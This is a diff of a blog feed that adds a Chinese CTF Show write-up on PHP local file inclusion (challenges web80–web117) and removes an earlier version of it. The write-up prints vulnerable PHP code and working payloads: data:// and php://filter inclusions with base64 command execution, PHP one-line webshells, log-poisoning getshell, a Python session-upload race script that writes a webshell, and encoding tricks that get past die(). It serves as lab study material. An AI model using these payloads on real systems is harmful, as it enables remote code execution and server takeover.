-<p>XSS绕过也可以看看该文章：<a href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a></p>
-<hr>
-<p><strong>先记录到这里，以后有补充还会更新的</strong></p>
+
+<h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>出现 data的话就会被替换掉</p>
+<p><strong>php:&#x2F;&#x2F;input</strong>还可以用，只是目录下的flag.php ——&gt; fl0g.php</p>
+<p>**file:&#x2F;&#x2F;**协议也可以用</p>
+<h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 15:51:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>连<code>：</code>都过滤了</p>
+<p>%3A</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">?file=data%<span class="number">3</span>A<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw==</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>Hint</strong>：包含日志文件 进行getshell 日志文件路径： <code>?file=/var/log/nginx/access.log</code></p>
+<p>直接用file：进行命令执行看看</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[cmd]);<span class="keyword">echo</span> PHP_DATADIR;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_7.png"></p>
+
+
+<p>需要你自己加上空格（%20），直接加空格就会截断，后面就没办法反应。</p>
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_8.png"></p>
+
+
+<h1 id="web83-web86"><a href="#web83-web86" class="headerlink" title="web83 - web86"></a>web83 - web86</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">session_destroy</span>(): Trying to destroy uninitialized session in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 20:28:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>估计是session_destroy()被禁用了，页面显示报错</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">session_destroy</span>(): Trying to destroy uninitialized session in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>脚本跑不出来</p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://93a5ba3f-7aea-4855-8fa3-5ecc6311ef67.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">proxy=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url,</span><br><span class="line">            data=&#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line">        resposne2=session.get(url+<span class="string">&#x27;1.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    evnet=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">    evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>写个上传脚本</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://b9fddb46-a4f3-49d7-a06d-18463c73ebf3.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>然后抓包，加一下<code>PHPSESSID</code>，在送去爆破就可以了</p>
+<p>方法没有做出来。</p>
+<h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>die 函数 等同于 exit()：exit 函数输出一个消息并且退出当前脚本。脚本会我们传入的content参数中加入die，从而让我们无法利用写入的一句话木马。</p>
+<p>存在urldecode（）函数，我们需要进行URL编码</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=1.php</span><br><span class="line">进行URL全编码</span><br><span class="line">？file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[pass]);?&gt;</span><br><span class="line">写成</span><br><span class="line">之所以加上nb，是因为要把不需要的代码给解码掉，是前面剩下phpdie，一共6个字符，所以需要再加2个字符变8个</span><br><span class="line">content=nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>将此传上去，就可以成功了</p>
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_9.png"></p>
+
+
+<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>直接改变之前的代码了，就过滤了php，还有过滤了一些符号。</p>
+<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>data：&#x2F;&#x2F; 伪协议</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fla*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>进行base64编码，记住去除等号</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//db7b5767-69bb-4227-a74f-12e3e60bbed1.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>传入一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>进行base64编码，</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9QSFAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg==</span></span><br></pre></td></tr></table></figure>
+
+
+<p>传上直接getshell</p>
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_10.png" alt="image_10"></p>
+
+
+<h1 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h1><p>misc+lfi</p>
+<p>就是一道misc题目吧</p>
+<p>进去是一短视</p>
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_11.png"></p>
+
+
+<p>好怀念的说</p>
+<p>直接使用file伪协议</p>
+<p>开始我使用常用的，没有回显，我就是只剩下flag.php，就出来了。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/../../../../../../flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_12.png"></p>
+
+
+<h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: yu22x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 18:16:59</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p>又是要绕过死亡die，把常用都禁用了，在官网上有其他的</p>
+<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP支持的编码方式</a></p>
+<p>UCS-2LE UCS-2BE编码</p>
+<p>测试代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;);</span></span><br><span class="line"><span class="string">echo &quot;经过一次反转:&quot;.$result.&quot;\n&quot;;</span></span><br><span class="line"><span class="string">echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, $result);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>本来想用4的试试，但是php die 不满足条件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line">post:</span><br><span class="line">contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_13.png"></p>
+
 ]]></content>
       <categories>
         <category>web渗透</category>
       </categories>
       <tags>
         <tag>web</tag>
+        <tag>文件包含</tag>
+        <tag>练习题</tag>
       </tags>
   </entry>
   <entry>
@@ -751,206 +951,6 @@
       <tags>
         <tag>web</tag>
         <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF Show(文件包含)</title>
-    <url>/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本场题目来自于CTF show，本文只是记录学习过程，以及能够提供一点小帮助再好不过</p>
-<p><strong>web78 -web118</strong></p>
-<span id="more"></span>
-
-
-<h1 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>使用php伪协议php:&#x2F;&#x2F;filter来构造payload</p>
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</span><br><span class="line"></span><br><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-16469231625671.png"></p>
-
-
-<h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F; 伪协议"></a>file:&#x2F;&#x2F; 伪协议</h2><p><code>file=file:///var/log/nginx/access.log</code>，来确定是否能读取 nginx 的日志。</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_1.png"></p>
-
-
-<p>确认日志可以访问，对其抓包</p>
